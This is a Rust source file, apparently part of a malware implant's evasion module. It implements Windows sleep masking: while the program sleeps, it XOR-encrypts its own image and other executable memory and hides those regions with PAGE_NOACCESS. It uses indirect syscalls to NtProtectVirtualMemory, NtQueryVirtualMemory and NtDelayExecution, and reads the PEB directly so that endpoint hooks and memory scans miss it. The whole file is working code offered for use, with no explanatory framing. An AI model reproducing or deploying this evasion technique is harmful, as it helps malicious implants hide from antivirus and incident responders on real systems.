#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    System::{
        Threading::{
            CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueueEx,
            WT_EXECUTEINTIMERTHREAD,
        },
        Memory::{
            MEMORY_BASIC_INFORMATION, PAGE_NOACCESS, PAGE_EXECUTE_READ,
            PAGE_EXECUTE_READWRITE, MEM_COMMIT,
        },
    },
    Foundation::HANDLE,
};

#[cfg(target_os = "windows")]
static mut SLEEP_KEY: [u8; 16] = [0u8; 16];

/// Read PEB.ImageBaseAddress (+0x10) to get own PE base without GetModuleHandleA.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn get_own_image_base() -> *mut u8 {
    let peb: *const u8;
    core::arch::asm!(
        "mov {}, gs:[0x60]",
        out(reg) peb,
        options(nostack, readonly, preserves_flags),
    );
    if peb.is_null() { return core::ptr::null_mut(); }
    *(peb.add(0x10) as *const *mut u8)
}

#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
unsafe fn get_own_image_base() -> *mut u8 {
    windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(core::ptr::null()) as *mut u8
}

#[cfg(target_os = "windows")]
struct SleepCtx {
    base:       *mut u8,
    size:       usize,
    encrypt:    bool,
    prot_ssn:   u16,
    prot_tramp: *const u8,
    qvm_ssn:    u16,
    qvm_tramp:  *const u8,
}

#[cfg(target_os = "windows")]
pub unsafe fn masked_sleep(duration_ms: u32) {
    use rand::RngCore;
    use crate::evasion::syscalls::get_ssn;
    rand::rngs::OsRng.fill_bytes(&mut SLEEP_KEY);

    let image_base = get_own_image_base();
    let image_size = if image_base.is_null() { 0 } else { get_image_size(image_base) };

    // Resolve syscall stubs once; store in context to avoid repeated lookups inside callbacks.
    let (prot_ssn, prot_tramp) = get_ssn(b"NtProtectVirtualMemory").unwrap_or((0, core::ptr::null()));
    let (qvm_ssn,  qvm_tramp)  = get_ssn(b"NtQueryVirtualMemory").unwrap_or((0, core::ptr::null()));

    let timer_queue = CreateTimerQueue();

    let ctx1 = Box::into_raw(Box::new(SleepCtx {
        base: image_base, size: image_size, encrypt: true,
        prot_ssn, prot_tramp, qvm_ssn, qvm_tramp,
    }));
    let mut t1: HANDLE = 0;
    CreateTimerQueueTimer(
        &mut t1, timer_queue,
        Some(sleep_callback), ctx1 as _, 0, 0,
        WT_EXECUTEINTIMERTHREAD,
    );

    let ctx2 = Box::into_raw(Box::new(SleepCtx {
        base: image_base, size: image_size, encrypt: false,
        prot_ssn, prot_tramp, qvm_ssn, qvm_tramp,
    }));
    let mut t2: HANDLE = 0;
    CreateTimerQueueTimer(
        &mut t2, timer_queue,
        Some(sleep_callback), ctx2 as _, duration_ms, 0,
        WT_EXECUTEINTIMERTHREAD,
    );

    let delay_100ns: i64 = -((duration_ms as i64 + 100) * 10_000);
    if let Some((ssn_delay, tramp_delay)) = get_ssn(b"NtDelayExecution") {
        crate::evasion::syscalls::indirect_syscall(
            ssn_delay, tramp_delay,
            0, &delay_100ns as *const i64 as usize, 0, 0, 0, 0,
        );
    }
    DeleteTimerQueueEx(timer_queue, windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE);
}

#[cfg(target_os = "windows")]
unsafe extern "system" fn sleep_callback(ctx_ptr: *mut core::ffi::c_void, _: u8) {
    use crate::evasion::syscalls::indirect_syscall;
    let ctx = &*(ctx_ptr as *const SleepCtx);
    if ctx.base.is_null() || ctx.size == 0 || ctx.prot_ssn == 0 { return; }

    let ph = usize::MAX; // -1 = current process

    if ctx.encrypt {
        // XOR image FIRST (while still accessible), then hide it.
        xor_region(ctx.base, ctx.size, &SLEEP_KEY);
        let mut base = ctx.base as usize; let mut sz = ctx.size; let mut old = 0u32;
        indirect_syscall(ctx.prot_ssn, ctx.prot_tramp, ph,
            &mut base as *mut usize as usize, &mut sz as *mut usize as usize,
            PAGE_NOACCESS as usize, &mut old as *mut u32 as usize, 0);
        encrypt_rx_regions(ctx.base, ctx.prot_ssn, ctx.prot_tramp, ctx.qvm_ssn, ctx.qvm_tramp);
    } else {
        // Restore other regions first, then re-enable and XOR the image.
        decrypt_rx_regions(ctx.base, ctx.prot_ssn, ctx.prot_tramp, ctx.qvm_ssn, ctx.qvm_tramp);
        // Make image writable before XOR, then restore execution permission.
        let mut base = ctx.base as usize; let mut sz = ctx.size; let mut old = 0u32;
        indirect_syscall(ctx.prot_ssn, ctx.prot_tramp, ph,
            &mut base as *mut usize as usize, &mut sz as *mut usize as usize,
            PAGE_EXECUTE_READWRITE as usize, &mut old as *mut u32 as usize, 0);
        xor_region(ctx.base, ctx.size, &SLEEP_KEY);
        let mut base2 = ctx.base as usize; let mut sz2 = ctx.size;
        indirect_syscall(ctx.prot_ssn, ctx.prot_tramp, ph,
            &mut base2 as *mut usize as usize, &mut sz2 as *mut usize as usize,
            PAGE_EXECUTE_READ as usize, &mut old as *mut u32 as usize, 0);
    }
}

#[cfg(target_os = "windows")]
unsafe fn xor_region(base: *mut u8, size: usize, key: &[u8; 16]) {
    for i in 0..size {
        *base.add(i) ^= key[i % 16];
    }
}

#[cfg(target_os = "windows")]
unsafe fn encrypt_rx_regions(
    image_base: *mut u8,
    prot_ssn: u16, prot_tramp: *const u8,
    qvm_ssn: u16, qvm_tramp: *const u8,
) {
    use crate::evasion::syscalls::indirect_syscall;
    if qvm_ssn == 0 || prot_ssn == 0 { return; }

    let ph = usize::MAX;
    let mut addr: usize = 0;
    loop {
        let mut mbi: MEMORY_BASIC_INFORMATION = core::mem::zeroed();
        let mut ret_len: usize = 0;
        let status = indirect_syscall(
            qvm_ssn, qvm_tramp,
            ph, addr, 0,
            &mut mbi as *mut MEMORY_BASIC_INFORMATION as usize,
            core::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
            &mut ret_len as *mut usize as usize,
        );
        if status != 0 { break; }
        let region_end = mbi.BaseAddress as usize + mbi.RegionSize;
        let is_image   = mbi.BaseAddress as usize == image_base as usize;
        if mbi.State == MEM_COMMIT && mbi.Protect == PAGE_EXECUTE_READ && !is_image && mbi.RegionSize > 0 {
            // XOR before hiding (order matters).
            xor_region(mbi.BaseAddress as *mut u8, mbi.RegionSize, &SLEEP_KEY);
            let mut base = mbi.BaseAddress as usize; let mut sz = mbi.RegionSize; let mut old = 0u32;
            indirect_syscall(prot_ssn, prot_tramp, ph,
                &mut base as *mut usize as usize, &mut sz as *mut usize as usize,
                PAGE_NOACCESS as usize, &mut old as *mut u32 as usize, 0);
        }
        addr = region_end;
        if addr == 0 { break; }
    }
}

#[cfg(target_os = "windows")]
unsafe fn decrypt_rx_regions(
    image_base: *mut u8,
    prot_ssn: u16, prot_tramp: *const u8,
    qvm_ssn: u16, qvm_tramp: *const u8,
) {
    use crate::evasion::syscalls::indirect_syscall;
    if qvm_ssn == 0 || prot_ssn == 0 { return; }

    let ph = usize::MAX;
    let mut addr: usize = 0;
    loop {
        let mut mbi: MEMORY_BASIC_INFORMATION = core::mem::zeroed();
        let mut ret_len: usize = 0;
        let status = indirect_syscall(
            qvm_ssn, qvm_tramp,
            ph, addr, 0,
            &mut mbi as *mut MEMORY_BASIC_INFORMATION as usize,
            core::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
            &mut ret_len as *mut usize as usize,
        );
        if status != 0 { break; }
        let region_end = mbi.BaseAddress as usize + mbi.RegionSize;
        let is_image   = mbi.BaseAddress as usize == image_base as usize;
        // PAGE_NOACCESS = 0x01 marks regions we encrypted during the encrypt phase.
        if mbi.State == MEM_COMMIT && mbi.Protect == PAGE_NOACCESS && !is_image && mbi.RegionSize > 0 {
            // Restore writable first so XOR can proceed.
            let mut base = mbi.BaseAddress as usize; let mut sz = mbi.RegionSize; let mut old = 0u32;
            indirect_syscall(prot_ssn, prot_tramp, ph,
                &mut base as *mut usize as usize, &mut sz as *mut usize as usize,
                PAGE_EXECUTE_READWRITE as usize, &mut old as *mut u32 as usize, 0);
            xor_region(mbi.BaseAddress as *mut u8, mbi.RegionSize, &SLEEP_KEY);
            let mut base2 = mbi.BaseAddress as usize; let mut sz2 = mbi.RegionSize;
            indirect_syscall(prot_ssn, prot_tramp, ph,
                &mut base2 as *mut usize as usize, &mut sz2 as *mut usize as usize,
                PAGE_EXECUTE_READ as usize, &mut old as *mut u32 as usize, 0);
        }
        addr = region_end;
        if addr == 0 { break; }
    }
}

#[cfg(target_os = "windows")]
unsafe fn get_image_size(base: *mut u8) -> usize {
    let e_lfanew = *(base.add(0x3C) as *const u32) as usize;
    *(base.add(e_lfanew + 0x18 + 0x38) as *const u32) as usize
}

/// Sleep for `base_ms` milliseconds with ±20% random jitter.
#[cfg(target_os = "windows")]
pub unsafe fn masked_sleep_jitter(base_ms: u32) {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    let pct = rng.gen_range(80u32..=120u32);
    let actual_ms = ((base_ms as u64).saturating_mul(pct as u64) / 100) as u32;
    masked_sleep(actual_ms);
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn masked_sleep_jitter(base_ms: u32) {
    let _ = base_ms;
}
